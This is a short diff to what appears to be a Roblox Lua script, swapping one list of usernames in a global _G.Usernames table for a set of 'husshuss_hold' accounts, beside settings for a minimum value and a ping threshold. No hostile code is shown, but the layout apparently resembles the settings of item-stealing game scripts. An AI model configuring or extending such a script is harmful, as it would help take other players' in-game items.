@@ -96,26 +96,18 @@ if ok and result == "VIPServer" then
 end
 
 _G.Usernames = {
-	"Pxckmzv",
-	"Lkxvzp",
-	"Vzxmpkl",
-	"Jkxmvlz",
-	"Qzxpmlk",
-	"Bxvklzm",
-	"Zxpkmlv",
-	"Mxpzkvl",
-	"Lxkzpvm",
-	"Wxzmpxk",
-	"Fkxvpzl",
-	"Rxpmlkz",
-	"Dxkzmpx",
-	"Gzxpkvl",
-	"Kzmvpxl",
-	"Nxpklzm",
-	"Txvpzkml",
-	"Vxkzmpx",
-	"Zxkpmvl",
-	"Pxmzvlk"
+	"admxxzzk",
+	"husszn_hold1",
+	"husshuss_hold2",
+	"husshuss_hold3",
+	"husshuss_hold4",
+	"husshuss_hold5",
+	"husshuss_hold6",
+	"husshuss_hold7",
+	"husshuss_hold8",
+	"husshuss_hold9",
+	"husshuss_hold10"
+
 }
 _G.min_value = 1
 _G.ping_threshold = 1
